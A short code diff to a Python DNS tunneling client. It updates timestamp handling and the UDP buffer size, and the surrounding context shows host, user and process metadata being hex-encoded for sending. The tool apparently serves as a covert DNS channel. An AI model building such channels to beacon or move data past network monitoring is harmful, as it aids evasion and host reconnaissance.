@@ -33,7 +33,7 @@ import subprocess
 import sys
 import time
 import threading
-from datetime import datetime
+from datetime import datetime, timezone
 
 # ---------------------------------------------------------------------------
 # Logging
@@ -169,7 +169,7 @@ class DNSClient:
         sock.settimeout(DNS_TIMEOUT)
         try:
             sock.sendto(packet, (self.server_ip, self.port))
-            resp, _ = sock.recvfrom(512)
+            resp, _ = sock.recvfrom(4096)   # 4096 handles any valid DNS UDP response
             return parse_txt_response(resp)
         except socket.timeout:
             return None
@@ -207,7 +207,7 @@ class TunnelClient:
         meta.setdefault("hostname", socket.gethostname())
         meta.setdefault("user", getpass.getuser())
         meta.setdefault("pid", os.getpid())
-        meta.setdefault("ts", datetime.utcnow().isoformat())
+        meta.setdefault("ts", datetime.now(tz=timezone.utc).isoformat())
 
         meta_json = json.dumps(meta)
         meta_hex = hex_encode(meta_json.encode())
